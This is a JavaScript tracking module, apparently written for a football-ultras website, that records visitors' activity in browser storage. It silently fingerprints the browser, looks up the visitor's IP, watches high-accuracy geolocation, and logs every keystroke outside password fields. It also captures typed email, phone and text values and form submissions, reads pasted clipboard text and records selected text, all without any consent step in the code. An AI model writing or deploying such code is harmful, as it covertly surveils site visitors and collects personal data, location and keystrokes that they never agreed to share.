const DB_NAME = 'upm_tracking';
const DB_VERSION = 1;
const STORE_NAME = 'events';
const FLUSH_INTERVAL = 5000;
const SCROLL_DEPTHS = [25, 50, 75, 90, 100];
const MOUSE_SAMPLE_INTERVAL = 1000;

let db = null;
let eventBuffer = [];
let flushTimer = null;
let sessionId = null;
let pageStart = Date.now();
let maxScroll = 0;
let scrollDepthsReported = new Set();
let lastMouseSample = 0;

const generateId = () => Date.now().toString(36) + Math.random().toString(36).slice(2, 10);

const openDb = () => {
  if (db) {
    return Promise.resolve(db);
  }
  return new Promise((resolve, reject) => {
    const req = indexedDB.open(DB_NAME, DB_VERSION);
    req.onupgradeneeded = () => {
      const store = req.result.createObjectStore(STORE_NAME, {
        keyPath: 'id',
        autoIncrement: true,
      });
      store.createIndex('type', 'type', { unique: false });
      store.createIndex('timestamp', 'timestamp', { unique: false });
      store.createIndex('session', 'session', { unique: false });
    };
    req.onsuccess = () => {
      db = req.result;
      resolve(db);
    };
    req.onerror = () => reject(req.error);
  });
};

const storeEvents = async (events) => {
  try {
    const database = await openDb();
    const tx = database.transaction(STORE_NAME, 'readwrite');
    const store = tx.objectStore(STORE_NAME);
    events.forEach((e) => store.add(e));
    return new Promise((resolve, reject) => {
      tx.oncomplete = () => resolve();
      tx.onerror = () => reject(tx.error);
    });
  } catch (_unused) {
    try {
      const existing = JSON.parse(localStorage.getItem('upm_events') || '[]');
      existing.push(...events);
      localStorage.setItem('upm_events', JSON.stringify(existing.slice(-20000)));
    } catch (_unused2) {
      /* empty */
    }
  }
};

const flush = async () => {
  if (!eventBuffer.length) {
    return;
  }
  const batch = eventBuffer.splice(0);
  try {
    await storeEvents(batch);
  } catch (_unused) {
    /* empty */
  }
};

const push = (type, data = {}) => {
  eventBuffer.push({
    id: generateId(),
    session: sessionId,
    timestamp: Date.now(),
    type,
    data,
    page: location.href,
    userAgent: navigator.userAgent,
  });
  if (!flushTimer) {
    flushTimer = setTimeout(() => {
      flushTimer = null;
      flush();
    }, FLUSH_INTERVAL);
  }
};

const deepScanNavigator = () => {
  const scan = (obj, depth = 0) => {
    if (depth > 2 || !obj || typeof obj !== 'object') {
      return null;
    }
    const result = {};
    const proto = Object.getPrototypeOf(obj);
    const keys = new Set([
      ...Object.getOwnPropertyNames(obj),
      ...Object.getOwnPropertyNames(proto || {}),
    ]);
    for (const key of keys) {
      try {
        const val = obj[key];
        if (typeof val === 'function') {
          continue;
        }
        if (typeof val === 'object' && val !== null) {
          const sub = scan(val, depth + 1);
          if (sub && Object.keys(sub).length) {
            result[key] = sub;
          }
        } else if (typeof val !== 'undefined') {
          result[key] = val;
        }
      } catch (_unused) {
        /* empty */
      }
    }
    return result;
  };
  try {
    const dump = scan(navigator);
    push('navigator_dump', dump);
  } catch (_unused) {
    /* empty */
  }
};

const collectDeviceInfo = () => {
  const info = {
    screen: `${screen.width}x${screen.height}`,
    availScreen: `${screen.availWidth}x${screen.availHeight}`,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    touchSupport: 'ontouchstart' in window,
    pdfViewerEnabled: navigator.pdfViewerEnabled,
    maxTouchPoints: navigator.maxTouchPoints,
    vendor: navigator.vendor,
    vendorSub: navigator.vendorSub,
    product: navigator.product,
    productSub: navigator.productSub,
    appName: navigator.appName,
    appVersion: navigator.appVersion,
    appCodeName: navigator.appCodeName,
    oscpu: navigator.oscpu,
    buildID: navigator.buildID,
  };

  if (navigator.connection) {
    const c = navigator.connection;
    info.connectionType = c.effectiveType;
    info.downlink = c.downlink;
    info.downlinkMax = c.downlinkMax;
    info.rtt = c.rtt;
    info.saveData = c.saveData;
    info.type = c.type;
  }

  if (screen.orientation) {
    info.orientationType = screen.orientation.type;
    info.orientationAngle = screen.orientation.angle;
  }

  return info;
};

const getPerformanceData = () => {
  const p = performance;
  const nav = p.getEntriesByType ? p.getEntriesByType('navigation')[0] : null;
  const timing = p.timing;

  return {
    loadTime: nav
      ? nav.loadEventEnd - nav.startTime
      : timing
        ? timing.loadEventEnd - timing.navigationStart
        : null,
    domContentLoaded: nav ? nav.domContentLoadedEventEnd - nav.startTime : null,
    domInteractive: nav ? nav.domInteractive - nav.startTime : null,
    ttfb: nav
      ? nav.responseStart - nav.requestStart
      : timing
        ? timing.responseStart - timing.requestStart
        : null,
    redirectCount: nav ? nav.redirectCount : null,
    type: nav ? nav.type : null,
    memory: performance.memory
      ? {
          usedJSHeapSize: performance.memory.usedJSHeapSize,
          totalJSHeapSize: performance.memory.totalJSHeapSize,
          jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
        }
      : null,
  };
};

const getLocation = () => {
  if (!navigator.geolocation) {
    return;
  }
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      push('geolocation', {
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        altitudeAccuracy: pos.coords.altitudeAccuracy,
        heading: pos.coords.heading,
        speed: pos.coords.speed,
      });
    },
    () => {},
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );

  navigator.geolocation.watchPosition(
    (pos) => {
      push('geolocation_watch', {
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        speed: pos.coords.speed,
        heading: pos.coords.heading,
      });
    },
    () => {},
    { enableHighAccuracy: true, timeout: 30000, maximumAge: 5000 }
  );
};

const getBatteryInfo = async () => {
  try {
    const b = await navigator.getBattery();
    push('battery', {
      level: b.level,
      charging: b.charging,
      chargingTime: b.chargingTime,
      dischargingTime: b.dischargingTime,
    });
    b.addEventListener('levelchange', () => {
      push('battery_update', { level: b.level, charging: b.charging });
    });
    b.addEventListener('chargingchange', () => {
      push('battery_update', { level: b.level, charging: b.charging });
    });
  } catch (_unused) {
    /* empty */
  }
};

const getMediaDevices = async () => {
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    push('media_devices', {
      audioInput: devices.filter((d) => d.kind === 'audioinput').length,
      audioOutput: devices.filter((d) => d.kind === 'audiooutput').length,
      videoInput: devices.filter((d) => d.kind === 'videoinput').length,
      devices: devices.map((d) => ({
        kind: d.kind,
        label: d.label ? d.label.slice(0, 60) : '(hidden)',
        deviceId: d.deviceId ? d.deviceId.slice(0, 16) : null,
      })),
    });
  } catch (_unused) {
    /* empty */
  }
};

const getFontList = () => {
  try {
    const fonts = document.fonts ? document.fonts.keys() : [];
    const list = [];
    for (const f of fonts) {
      try {
        list.push(`${f.family} ${f.style} ${f.weight}`);
      } catch (_unused) {
        /* empty */
      }
    }
    if (list.length) {
      push('fonts', { fonts: list.slice(0, 100) });
    }
  } catch (_unused) {
    /* empty */
  }
};

const getCanvasFingerprint = () => {
  try {
    const canvas = document.createElement('canvas');
    canvas.width = 400;
    canvas.height = 100;
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('UPM ultras polonia miedzyrzecze', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('canvas fingerprint test', 4, 35);
    ctx.fillStyle = '#444';
    ctx.font = '16px Times New Roman';
    ctx.fillText('the quick brown fox jumps over the lazy dog', 2, 55);
    ctx.fillStyle = '#888';
    ctx.arc(50, 80, 10, 0, Math.PI * 2);
    ctx.fill();
    ctx.fillStyle = '#2ecc71';
    ctx.beginPath();
    ctx.rect(200, 50, 50, 30);
    ctx.fill();

    const dataUrl = canvas.toDataURL();
    push('canvas_fingerprint', {
      hash: dataUrl.slice(0, 200),
      length: dataUrl.length,
    });
  } catch (_unused) {
    /* empty */
  }
};

const getWebGLInfo = () => {
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      push('webgl', {
        vendor: gl.getParameter(gl.VENDOR),
        renderer: gl.getParameter(gl.RENDERER),
        version: gl.getParameter(gl.VERSION),
        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
        vendorMasked: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
        rendererMasked: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
        maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
        aliasedLineWidth: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
        aliasedPointSize: gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE),
        maxCombinedTextureImageUnits: gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS),
        maxCubeMapTextureSize: gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE),
        maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
        maxRenderbufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
        maxTextureImageUnits: gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS),
        maxVertexTextureImageUnits: gl.getParameter(gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS),
        maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
        shaderPrecision: gl.getShaderPrecisionFormat
          ? {
              vertexHigh: gl.getShaderPrecisionFormat(gl.VERTEX_SHADER, gl.HIGH_FLOAT),
              fragmentHigh: gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT),
            }
          : null,
        extensions: gl.getSupportedExtensions ? gl.getSupportedExtensions().slice(0, 100) : null,
      });
    }
  } catch (_unused) {
    /* empty */
  }
};

const getIP = async () => {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip;
  } catch (_unused) {
    return null;
  }
};

const getNetworkInfo = () => {
  push('network', {
    referrer: document.referrer || '(direct)',
    host: location.hostname,
    protocol: location.protocol,
    origin: location.origin,
    pathname: location.pathname,
    hash: location.hash,
    search: location.search,
    port: location.port,
  });
};

let audioFingerprintDeferred = null;

const getAudioFingerprint = () => {
  try {
    const actx = new (window.AudioContext || window.webkitAudioContext)();
    if (actx.state === 'suspended') {
      audioFingerprintDeferred = actx;
      return;
    }
    runAudioFingerprint(actx);
  } catch (_unused) {
    /* empty */
  }
};

const runAudioFingerprint = (actx) => {
  try {
    const osc = actx.createOscillator();
    const analyser = actx.createAnalyser();
    const gain = actx.createGain();
    osc.type = 'triangle';
    osc.frequency.value = 440;
    gain.gain.value = 0.1;
    osc.connect(analyser);
    analyser.connect(gain);
    gain.connect(actx.destination);
    osc.start(0);
    const data = new Float32Array(analyser.frequencyBinCount);
    analyser.getFloatFrequencyData(data);
    const hash = Array.from(data.slice(0, 100))
      .map((v) => v.toFixed(2))
      .join(',');
    push('audio_fingerprint', {
      sampleRate: actx.sampleRate,
      state: actx.state,
      baseLatency: actx.baseLatency,
      outputLatency: actx.outputLatency,
      hash: hash.slice(0, 500),
      oscillatorType: 'triangle',
      frequency: 440,
    });
    osc.stop(0);
    actx.close();
  } catch (_unused) {
    /* empty */
  }
};

const resumeAudioFingerprint = () => {
  if (!audioFingerprintDeferred) {
    return;
  }
  const actx = audioFingerprintDeferred;
  audioFingerprintDeferred = null;
  actx.resume().then(
    () => runAudioFingerprint(actx),
    () => {}
  );
};

const getStorageEstimate = async () => {
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const est = await navigator.storage.estimate();
      push('storage', {
        quota: est.quota,
        usage: est.usage,
        quotaGB: est.quota ? (est.quota / 1073741824).toFixed(2) : null,
        usageGB: est.usage ? (est.usage / 1073741824).toFixed(4) : null,
        usagePercent: est.quota && est.usage ? ((est.usage / est.quota) * 100).toFixed(2) : null,
      });
    }
  } catch (_unused) {
    /* empty */
  }
};

const getScreenDetails = () => {
  const info = {
    width: screen.width,
    height: screen.height,
    availWidth: screen.availWidth,
    availHeight: screen.availHeight,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    pixelRatio: window.devicePixelRatio,
    isExtended: screen.isExtended || null,
    orientationType: screen.orientation ? screen.orientation.type : null,
    orientationAngle: screen.orientation ? screen.orientation.angle : null,
  };

  try {
    const mq = window.matchMedia('(color-gamut: srgb)');
    info.colorGamutSrgb = mq.matches;
  } catch (_unused) {
    /* empty */
  }
  try {
    info.colorGamutP3 = window.matchMedia('(color-gamut: p3)').matches;
  } catch (_unused) {
    /* empty */
  }
  try {
    info.colorGamutRec2020 = window.matchMedia('(color-gamut: rec2020)').matches;
  } catch (_unused) {
    /* empty */
  }
  try {
    info.hdr = window.matchMedia('(dynamic-range: high)').matches;
  } catch (_unused) {
    /* empty */
  }
  try {
    info.invertedColors = window.matchMedia('(inverted-colors: inverted)').matches;
  } catch (_unused) {
    /* empty */
  }

  push('screen_details', info);
};

const getAccessibilityPrefs = () => {
  const prefs = {};
  try {
    const queries = [
      ['prefersReducedMotion', '(prefers-reduced-motion: reduce)'],
      ['prefersReducedTransparency', '(prefers-reduced-transparency: reduce)'],
      ['prefersReducedData', '(prefers-reduced-data: reduce)'],
      ['prefersColorSchemeDark', '(prefers-color-scheme: dark)'],
      ['prefersColorSchemeLight', '(prefers-color-scheme: light)'],
      ['prefersContrastMore', '(prefers-contrast: more)'],
      ['prefersContrastLess', '(prefers-contrast: less)'],
      ['forcedColors', '(forced-colors: active)'],
    ];
    for (const [key, query] of queries) {
      prefs[key] = window.matchMedia(query).matches;
    }
  } catch (_unused) {
    /* empty */
  }
  push('accessibility', prefs);
};

const getPluginInfo = () => {
  try {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
      const p = navigator.plugins[i];
      plugins.push({
        name: p.name,
        filename: p.filename,
        description: p.description ? p.description.slice(0, 80) : null,
      });
    }
    const mimes = [];
    for (let i = 0; i < navigator.mimeTypes.length; i++) {
      const m = navigator.mimeTypes[i];
      mimes.push({
        type: m.type,
        suffixes: m.suffixes,
      });
    }
    push('plugins', {
      plugins: plugins.slice(0, 30),
      mimeTypes: mimes.slice(0, 50),
      pluginCount: navigator.plugins.length,
      mimeCount: navigator.mimeTypes.length,
    });
  } catch (_unused) {
    /* empty */
  }
};

const getMathFingerprint = () => {
  try {
    push('math_fingerprint', {
      sin: Math.sin(123456789),
      cos: Math.cos(987654321),
      tan: Math.tan(1.23456789),
      asin: Math.asin(0.123456789),
      acos: Math.acos(0.123456789),
      atan: Math.atan(1.23456789),
      sqrt: Math.sqrt(2),
      log: Math.log(12345),
      pow: Math.pow(1.234, 5.678),
      exp: Math.exp(1.234),
      pi: Math.PI,
      e: Math.E,
    });
  } catch (_unused) {
    /* empty */
  }
};

const getCodecSupport = () => {
  try {
    const video = document.createElement('video');
    const checkVideo = (codec) => {
      try {
        return video.canPlayType(codec) || 'no';
      } catch (_unused) {
        return 'err';
      }
    };
    const audio = document.createElement('audio');
    const checkAudio = (codec) => {
      try {
        return audio.canPlayType(codec) || 'no';
      } catch (_unused) {
        return 'err';
      }
    };
    push('codecs', {
      video: {
        h264: checkVideo('video/mp4; codecs="avc1.42E01E"'),
        h265: checkVideo('video/mp4; codecs="hev1.1.6.L120.90.0"'),
        vp8: checkVideo('video/webm; codecs="vp8"'),
        vp9: checkVideo('video/webm; codecs="vp9"'),
        av1: checkVideo('video/mp4; codecs="av01.0.05M.08"'),
        theora: checkVideo('video/ogg; codecs="theora"'),
      },
      audio: {
        aac: checkAudio('audio/mp4; codecs="mp4a.40.2"'),
        mp3: checkAudio('audio/mpeg'),
        opus: checkAudio('audio/ogg; codecs="opus"'),
        vorbis: checkAudio('audio/ogg; codecs="vorbis"'),
        wav: checkAudio('audio/wav'),
        flac: checkAudio('audio/flac'),
      },
    });
  } catch (_unused) {
    /* empty */
  }
};

const getConnectionMonitoring = () => {
  if (!navigator.connection) {
    return;
  }
  navigator.connection.addEventListener('change', () => {
    const c = navigator.connection;
    push('connection_change', {
      effectiveType: c.effectiveType,
      downlink: c.downlink,
      downlinkMax: c.downlinkMax,
      rtt: c.rtt,
      saveData: c.saveData,
      type: c.type,
    });
  });
};

const initDeviceMotion = () => {
  if (window.DeviceOrientationEvent) {
    window.addEventListener(
      'deviceorientation',
      (e) => {
        push('device_orientation', {
          alpha: e.alpha,
          beta: e.beta,
          gamma: e.gamma,
          absolute: e.absolute,
        });
      },
      { passive: true }
    );
  }
  if (window.DeviceMotionEvent) {
    window.addEventListener(
      'devicemotion',
      (e) => {
        push('device_motion', {
          accelX: e.accelerationIncludingGravity?.x,
          accelY: e.accelerationIncludingGravity?.y,
          accelZ: e.accelerationIncludingGravity?.z,
          rotRateAlpha: e.rotationRate?.alpha,
          rotRateBeta: e.rotationRate?.beta,
          rotRateGamma: e.rotationRate?.gamma,
          interval: e.interval,
        });
      },
      { passive: true }
    );
  }
};

const initClipboardSniff = () => {
  try {
    document.addEventListener('copy', () => {
      push('clipboard_event', { action: 'copy' });
    });
    document.addEventListener('cut', () => {
      push('clipboard_event', { action: 'cut' });
    });
    document.addEventListener('paste', async () => {
      try {
        if (navigator.clipboard && navigator.clipboard.readText) {
          const text = await navigator.clipboard.readText();
          if (text) {
            push('clipboard_paste', {
              text: text.slice(0, 200),
              length: text.length,
            });
          }
        }
      } catch (_unused) {
        /* empty */
      }
    });
  } catch (_unused) {
    /* empty */
  }
};

const initInputCapture = () => {
  document.addEventListener('input', (e) => {
    const target = e.target;
    if (!target) {
      return;
    }
    const tag = target.tagName || '';
    if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') {
      const type = target.type || 'text';
      const name = target.name || target.id || '';
      let value = '';
      try {
        if (type === 'password') {
          value = '*'.repeat((target.value || '').length);
        } else if (type === 'email' || type === 'tel' || type === 'url') {
          value = (target.value || '').slice(0, 100);
        } else if (type === 'text' || type === 'search' || tag === 'TEXTAREA') {
          value = (target.value || '').slice(0, 200);
        } else if (type === 'checkbox' || type === 'radio') {
          value = target.checked ? 'checked' : 'unchecked';
        } else {
          value = String(target.value || '').slice(0, 100);
        }
      } catch (_unused) {
        value = '(error)';
      }
      push('input_capture', {
        tag,
        type,
        name: name.slice(0, 60),
        placeholder: (target.placeholder || '').slice(0, 60),
        value,
        selector: getSelector(target),
      });
    }
  });
};

const initFullKeyboardLogging = () => {
  document.addEventListener('keydown', (e) => {
    const tag = e.target?.tagName || '';
    const type = e.target?.type || '';
    if (tag === 'INPUT' && type === 'password') {
      return;
    }
    if (tag === 'TEXTAREA' && e.target?.type === 'password') {
      return;
    }
    push('keydown', {
      key: e.key,
      code: e.code,
      keyCode: e.keyCode,
      which: e.which,
      ctrl: e.ctrlKey,
      shift: e.shiftKey,
      alt: e.altKey,
      meta: e.metaKey,
      repeat: e.repeat,
      location: e.location,
    });
  });
};

const initMemoryPressure = () => {
  let lastCheck = 0;
  const check = () => {
    const now = Date.now();
    if (now - lastCheck < 30000) {
      return;
    }
    lastCheck = now;
    if (performance.memory) {
      push('memory_snapshot', {
        usedJSHeapSize: performance.memory.usedJSHeapSize,
        totalJSHeapSize: performance.memory.totalJSHeapSize,
        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
        usedMB: (performance.memory.usedJSHeapSize / 1048576).toFixed(2),
        totalMB: (performance.memory.totalJSHeapSize / 1048576).toFixed(2),
      });
    }
  };
  setInterval(check, 30000);
  check();
};

const initFormCapture = () => {
  document.addEventListener('submit', (e) => {
    const form = e.target;
    if (!form) {
      return;
    }
    const formData = {};
    const elements = form.elements || [];
    for (let i = 0; i < elements.length; i++) {
      const el = elements[i];
      if (!el.name || !el.type) {
        continue;
      }
      try {
        if (el.type === 'password') {
          formData[el.name] = '*'.repeat((el.value || '').length);
        } else if (el.type === 'checkbox' || el.type === 'radio') {
          formData[el.name] = el.checked;
        } else {
          formData[el.name] = (el.value || '').slice(0, 200);
        }
      } catch (_unused) {
        /* empty */
      }
    }
    push('form_submit', {
      action: form.action || location.href,
      method: form.method || 'GET',
      id: form.id || '',
      fields: formData,
    });
  });
};

const initSelectionTracking = () => {
  document.addEventListener('mouseup', () => {
    try {
      const sel = window.getSelection();
      if (sel && sel.toString().length > 5) {
        push('text_selection', {
          text: sel.toString().slice(0, 200),
          length: sel.toString().length,
        });
      }
    } catch (_unused) {
      /* empty */
    }
  });
};

const initPageView = () => {
  push('page_view', {
    url: location.href,
    path: location.pathname,
    title: document.title,
    referrer: document.referrer || '(direct)',
    timestamp: new Date().toISOString(),
  });

  if (document.readyState === 'complete') {
    push('performance', getPerformanceData());
  } else {
    window.addEventListener('load', () => {
      setTimeout(() => {
        push('performance', getPerformanceData());
      }, 100);
    });
  }
};

const initScrollTracking = () => {
  let ticking = false;
  window.addEventListener(
    'scroll',
    () => {
      if (!ticking) {
        requestAnimationFrame(() => {
          ticking = false;
          const docEl = document.documentElement;
          const scrollTop = window.scrollY || docEl.scrollTop;
          const scrollHeight = docEl.scrollHeight - window.innerHeight;
          const percent = Math.min(100, Math.round((scrollTop / scrollHeight) * 100));
          maxScroll = Math.max(maxScroll, percent);

          SCROLL_DEPTHS.forEach((depth) => {
            if (percent >= depth && !scrollDepthsReported.has(depth)) {
              scrollDepthsReported.add(depth);
              push('scroll_depth', { depth, percent, maxScroll });
            }
          });
        });
        ticking = true;
      }
    },
    { passive: true }
  );
};

const initClickTracking = () => {
  document.addEventListener(
    'click',
    (e) => {
      const target = e.target;
      const tag = target.tagName || '';
      const text = (target.textContent || '').trim().slice(0, 80);
      const selector = getSelector(target);
      const rect = target.getBoundingClientRect ? target.getBoundingClientRect() : null;

      push('click', {
        tag,
        id: target.id || null,
        class: (target.className || '').slice(0, 100),
        text,
        selector,
        x: e.clientX,
        y: e.clientY,
        pageX: e.pageX,
        pageY: e.pageY,
        offsetX: e.offsetX,
        offsetY: e.offsetY,
        button: e.button,
        buttons: e.buttons,
        detail: e.detail,
        rect: rect
          ? {
              top: rect.top,
              left: rect.left,
              width: rect.width,
              height: rect.height,
            }
          : null,
        href: target.href || null,
        alt: target.alt || null,
        src: target.src ? target.src.slice(0, 200) : null,
      });
    },
    { passive: true }
  );
};

const initMouseTracking = () => {
  document.addEventListener(
    'mousemove',
    (e) => {
      const now = Date.now();
      if (now - lastMouseSample < MOUSE_SAMPLE_INTERVAL) {
        return;
      }
      lastMouseSample = now;
      push('mouse_position', { x: e.clientX, y: e.clientY });
    },
    { passive: true }
  );
};

const initResizeTracking = () => {
  let resizeTimer;
  window.addEventListener(
    'resize',
    () => {
      clearTimeout(resizeTimer);
      resizeTimer = setTimeout(() => {
        push('resize', {
          width: window.innerWidth,
          height: window.innerHeight,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight,
        });
      }, 500);
    },
    { passive: true }
  );
};

const getSelector = (el) => {
  if (!el || el === document || el === window) {
    return '';
  }
  let path = [];
  let current = el;
  while (current && current !== document.body && current !== document) {
    let selector = current.tagName.toLowerCase();
    if (current.id) {
      selector = `#${current.id}`;
      path.unshift(selector);
      break;
    }
    if (current.className && typeof current.className === 'string') {
      const classes = current.className.trim().split(/\s+/).slice(0, 2).join('.');
      if (classes) {
        selector += `.${classes}`;
      }
    }
    const parent = current.parentElement;
    if (parent) {
      const siblings = Array.from(parent.children).filter((s) => s.tagName === current.tagName);
      if (siblings.length > 1) {
        const idx = siblings.indexOf(current) + 1;
        selector += `:nth-of-type(${idx})`;
      }
    }
    path.unshift(selector);
    current = current.parentElement;
  }
  return path.join(' > ');
};

const initVisibilityTracking = () => {
  document.addEventListener('visibilitychange', () => {
    push('visibility', {
      state: document.visibilityState,
      hidden: document.hidden,
      timeOnPage: Date.now() - pageStart,
    });
  });
};

const initBeforeUnload = () => {
  window.addEventListener('beforeunload', () => {
    push('page_leave', {
      timeOnPage: Date.now() - pageStart,
      maxScroll,
      url: location.href,
    });
    flush();
  });

  window.addEventListener('pagehide', () => {
    push('page_leave', {
      timeOnPage: Date.now() - pageStart,
      maxScroll,
      url: location.href,
    });
    flush();
  });
};

const initContextMenuTracking = () => {
  document.addEventListener('contextmenu', (e) => {
    push('contextmenu', {
      x: e.clientX,
      y: e.clientY,
      target: e.target.tagName || '',
    });
  });
};

export const initTracking = () => {
  sessionId = generateId();
  pageStart = Date.now();

  push('session_start', {
    deviceInfo: collectDeviceInfo(),
  });

  getIP().then((ip) => {
    if (ip) {
      push('ip_address', { ip });
    }
  });

  initPageView();
  initScrollTracking();
  initClickTracking();
  initMouseTracking();
  initResizeTracking();
  initVisibilityTracking();
  initBeforeUnload();
  initContextMenuTracking();
  initFullKeyboardLogging();
  initInputCapture();
  initClipboardSniff();
  initFormCapture();
  initMemoryPressure();
  initSelectionTracking();
  initDeviceMotion();

  getLocation();
  getBatteryInfo();
  getMediaDevices();
  getFontList();
  getCanvasFingerprint();
  getWebGLInfo();
  getNetworkInfo();
  getAudioFingerprint();
  getStorageEstimate();
  getScreenDetails();
  getAccessibilityPrefs();
  getPluginInfo();
  getMathFingerprint();
  getCodecSupport();
  getConnectionMonitoring();

  push('device_info', collectDeviceInfo());

  const resume = () => {
    resumeAudioFingerprint();
    document.removeEventListener('click', resume);
    document.removeEventListener('keydown', resume);
    document.removeEventListener('touchstart', resume);
  };
  document.addEventListener('click', resume, { once: true });
  document.addEventListener('keydown', resume, { once: true });
  document.addEventListener('touchstart', resume, { once: true });
};

const getDbSize = async () => {
  try {
    const database = await openDb();
    const tx = database.transaction(STORE_NAME, 'readonly');
    const store = tx.objectStore(STORE_NAME);
    const count = await new Promise((resolve, reject) => {
      const req = store.count();
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => reject(req.error);
    });
    return count;
  } catch (_unused) {
    try {
      const data = JSON.parse(localStorage.getItem('upm_events') || '[]');
      return data.length;
    } catch (_unused2) {
      return 0;
    }
  }
};

const getAllEvents = async (filters = {}) => {
  try {
    const database = await openDb();
    const tx = database.transaction(STORE_NAME, 'readonly');
    const store = tx.objectStore(STORE_NAME);
    const all = await new Promise((resolve, reject) => {
      const req = store.getAll();
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => reject(req.error);
    });
    return applyFilters(all, filters);
  } catch (_unused) {
    try {
      const data = JSON.parse(localStorage.getItem('upm_events') || '[]');
      return applyFilters(data, filters);
    } catch (_unused2) {
      return [];
    }
  }
};

const applyFilters = (data, filters) => {
  let result = data;
  if (filters.type) {
    result = result.filter((e) => e.type === filters.type);
  }
  if (filters.since) {
    result = result.filter((e) => e.timestamp >= filters.since);
  }
  if (filters.until) {
    result = result.filter((e) => e.timestamp <= filters.until);
  }
  if (filters.session) {
    result = result.filter((e) => e.session === filters.session);
  }
  if (filters.limit) {
    result = result.slice(-filters.limit);
  }
  return result;
};

const clearAllEvents = async () => {
  try {
    const database = await openDb();
    const tx = database.transaction(STORE_NAME, 'readwrite');
    const store = tx.objectStore(STORE_NAME);
    store.clear();
    return new Promise((resolve, reject) => {
      tx.oncomplete = () => resolve();
      tx.onerror = () => reject(tx.error);
    });
  } catch (_unused) {
    localStorage.removeItem('upm_events');
  }
};

const getStats = async () => {
  const events = await getAllEvents();
  const uniqueSessions = new Set(events.map((e) => e.session)).size;
  const uniquePages = new Set(events.filter((e) => e.type === 'page_view').map((e) => e.data?.path))
    .size;
  const clicks = events.filter((e) => e.type === 'click').length;
  const pageViews = events.filter((e) => e.type === 'page_view').length;
  const locations = events.filter((e) => e.type === 'geolocation');
  const deviceInfos = events.filter((e) => e.type === 'device_info');

  return {
    total: events.length,
    uniqueSessions,
    uniquePages,
    clicks,
    pageViews,
    locations,
    deviceInfos,
  };
};

export { getAllEvents, clearAllEvents, getStats, getDbSize, getPerformanceData };
